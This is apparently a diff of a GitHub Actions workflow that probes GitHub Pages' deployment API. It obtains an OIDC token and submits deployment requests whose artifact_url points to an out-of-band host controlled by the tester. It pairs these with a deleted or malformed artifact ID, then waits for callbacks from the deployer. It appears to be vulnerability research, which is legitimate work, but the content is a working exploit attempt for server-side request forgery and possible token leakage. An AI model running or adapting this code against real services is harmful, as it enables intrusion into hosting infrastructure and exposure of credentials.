@@ -1,4 +1,4 @@
-name: bf45db64-capture
+name: bf45db64-malformed-capture
 on:
   workflow_dispatch:
     inputs:
@@ -15,7 +15,14 @@ jobs:
     environment:
       name: github-pages
     steps:
-      - name: capture-arm
+      - name: create-malformed-artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: github-pages
+          path: /dev/null
+          compression-level: 9
+
+      - name: capture-with-malformed
         env:
           OOB: ${{ github.event.inputs.oob }}
           GH_TOKEN: ${{ github.token }}
@@ -23,14 +30,22 @@ jobs:
           TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
           echo "::add-mask::$TOKEN"
           API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
-          DELETED_ART=10910011657
+
+          # Find the artifact we just uploaded
+          MALFORMED_ID=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" | \
+            jq -r '.artifacts[] | select(.name=="github-pages") | .id')
+          echo "Malformed artifact ID: $MALFORMED_ID"
+
           echo "===== CONTROL: artifact_url ONLY (expect 400) ====="
           curl -s -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API" \
-            -d "{\"artifact_url\":\"https://$OOB/_apis/pipelines/1/runs/1/artifacts?arm=ctl\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
-          sleep 3
-          echo "===== ARM: DELETED artifact_id + arbitrary artifact_url ====="
+            -d "{\"artifact_url\":\"https://$OOB/_apis/pipelines/1/runs/1/artifacts?arm=ctl\",\"pages_build_version\":\"ctl-$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
+          sleep 5
+
+          echo "===== ARM: malformed artifact_id + arbitrary artifact_url ====="
           curl -s -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API" \
-            -d "{\"artifact_id\":$DELETED_ART,\"artifact_url\":\"https://$OOB/bf45db64-v3/_apis/pipelines/1/runs/1/artifacts?artifactName=github-pages\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
-          echo "===== WAIT for deployer ====="
-          for i in 1 2 3 4 5 6; do sleep 15; echo "tick $((i*15))s"; done
-          curl -s "https://$OOB/control-post-v3" || true
+            -d "{\"artifact_id\":$MALFORMED_ID,\"artifact_url\":\"https://$OOB/bf45-malformed/_apis/pipelines/1/runs/1/artifacts?arm=B_MALFORMED\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
+          
+          echo "===== WAIT for deployer callbacks ====="
+          for i in $(seq 1 8); do sleep 15; echo "tick $((i*15))s"; done
+          curl -s "https://$OOB/control-post-malformed" || true
